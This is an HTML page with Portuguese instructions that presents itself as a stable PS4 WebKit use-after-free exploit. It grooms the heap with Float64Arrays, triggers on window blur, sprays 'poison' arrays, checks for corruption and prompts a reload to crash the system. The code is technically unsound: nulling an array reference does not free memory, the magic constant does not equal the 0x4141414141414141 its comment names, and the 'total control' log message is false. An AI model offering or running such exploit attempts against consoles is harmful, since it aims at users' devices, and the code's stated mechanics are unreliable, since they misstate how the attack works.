
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Webkit UAF Exploit (Stable)</title>
<style>
    body { background-color: #1a1a1a; color: #ddd; font-family: sans-serif; text-align: center; }
    h1 { color: #ffcc00; }
    .status { border: 2px solid #555; padding: 20px; margin: 20px auto; max-width: 600px; background: #222; }
    button { background: #cc0000; color: white; border: none; padding: 15px 30px; font-size: 1.2em; cursor: pointer; font-weight: bold; }
    #log { text-align: left; margin: 20px auto; max-width: 800px; white-space: pre-wrap; background: #000; padding: 10px; border: 1px solid #444; min-height: 200px;}
</style>
</head>
<body>

<h1>PS4 Webkit: Stable UAF / Memory Corruption</h1>

<div class="status" id="msg">
    <b>INSTRUÇÕES:</b><br><br>
    1. Clique em "INICIAR EXPLOIT".<br>
    2. Aperte "OPTIONS" (Menu Lateral).<br>
    3. Observe a confirmação de CORRUPÇÃO DE MEMÓRIA.<br>
    4. Só depois, clique em "Atualizar" para confirmar o crash do sistema.
</div>

<button onclick="fire()">INICIAR EXPLOIT</button>

<div id="log">Logs do sistema...</div>

<script>
    const Msg = document.getElementById('msg');
    const Log = document.getElementById('log');
    
    function log(txt) { Log.innerHTML += txt + "\n"; }

    // O valor mágico que queremos ver (0x4141414141414141)
    // Em float double precision, isso é:
    const MAGIC_POISON = 2.121995791e-314; 

    // Configuração do Heap
    let controller_arrays = [];
    let target_arrays = [];
    const SPRAY_COUNT = 10000; // O valor que funcionou para você

    function fire() {
        Msg.innerText = "Preparando Heap... Aguarde.";
        log("[*] Alocando memória (Heap Grooming)...");

        // FASE 1: PREPARAÇÃO
        try {
            for(let i = 0; i < SPRAY_COUNT; i++) {
                // Array Controlador (Sobrevivente)
                // Usamos Float64Array. Se ele for corrompido, leremos o valor mágico.
                let ctrl = new Float64Array(16);
                ctrl[0] = i; // Marcamos com o índice original
                controller_arrays.push(ctrl);

                // Array Alvo (Vítima)
                // Este será liberado para criar o buraco
                let target = new Float64Array(16);
                target.fill(1.1);
                target_arrays.push(target);
            }
        } catch(e) { log("Erro: " + e); return; }

        Msg.innerText = "Memória PRONTA. Aperte OPTIONS agora!";
        log("[*] Heap pronto. Aguardando evento onblur...");

        // Trigger Fullscreen
        const doc = document.documentElement;
        if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
        else if (doc.requestFullscreen) doc.requestFullscreen();

        // FASE 2: GATILHO
        window.onblur = function() {
            log("[*] Blur detectado! Executando UAF...");
            
            // 1. FREE (A mágica acontece aqui)
            // Liberamos todos os alvos de uma vez.
            target_arrays = null; 

            // 2. SPRAY (Preenchendo os buracos)
            // Imediatamente enchemos a memória com nosso "veneno" (0x41...)
            let spray_storage = [];
            try {
                // Usamos um tamanho ligeiramente maior para garantir overlap
                // ou o mesmo tamanho dependendo do alocador.
                // Se funcionou antes, manteve-se Float64Array(20) ou similar.
                for(let i=0; i < SPRAY_COUNT * 2; i++) {
                    let poison = new Float64Array(20); 
                    poison.fill(MAGIC_POISON);
                    spray_storage.push(poison);
                }
            } catch(e) {}

            log("[*] Verificando corrupção...");

            // FASE 3: CHECAGEM (BINGO)
            let bingo = false;
            for(let i = 0; i < SPRAY_COUNT; i++) {
                // Se controller_arrays[i][0] não for mais 'i', e for nosso veneno...
                if (controller_arrays[i][0] === MAGIC_POISON) {
                    bingo = true;
                    document.body.style.background = "#005500"; // VERDE
                    
                    Msg.innerHTML = "<h1>BINGO! MEMORY CORRUPTION CONFIRMED</h1>";
                    log("\n[!!!] SUCESSO: Controller[" + i + "] corrompido!");
                    log("Valor esperado: " + i);
                    log("Valor encontrado: 0x4141414141414141");
                    log("Isso prova controle total sobre o objeto liberado.");
                    
                    // Não precisamos procurar mais
                    break; 
                }
            }

            if (!bingo) {
                log("[-] Falha na captura. Tente novamente.");
            } else {
                log("\n[*] Próximo passo: Clique em ATUALIZAR para demonstrar o Crash do sistema.");
            }
        };
    }
</script>
</body>
</html>
